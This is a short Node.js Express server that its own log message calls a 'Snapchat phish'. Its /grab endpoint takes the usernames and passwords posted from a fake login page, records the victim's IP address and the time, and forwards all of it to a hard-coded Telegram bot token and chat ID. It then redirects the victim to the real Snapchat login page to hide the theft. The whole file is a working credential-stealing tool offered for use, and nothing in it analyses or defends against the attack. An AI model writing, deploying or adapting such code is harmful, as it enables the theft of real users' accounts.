const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('./'));

const BOT_TOKEN = '8789687859:AAG6b6VQjtQZ0chuetPZie1l1bHjNYFm8_4';
const CHAT_ID = '8856114065';

app.post('/grab', function(req, res) {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  const message = `👻 Snapchat Creds\n👤 ${username}\n🔑 ${password}\n🌐 IP: ${ip}\n🕒 ${time}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  axios.post(url, { chat_id: CHAT_ID, text: message })
    .then(() => console.log('✅ Sent'))
    .catch(e => console.log('❌ Error:', e.message));

  res.redirect('https://accounts.snapchat.com/accounts/v2/login');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Snapchat phish running on port ${PORT}`);
});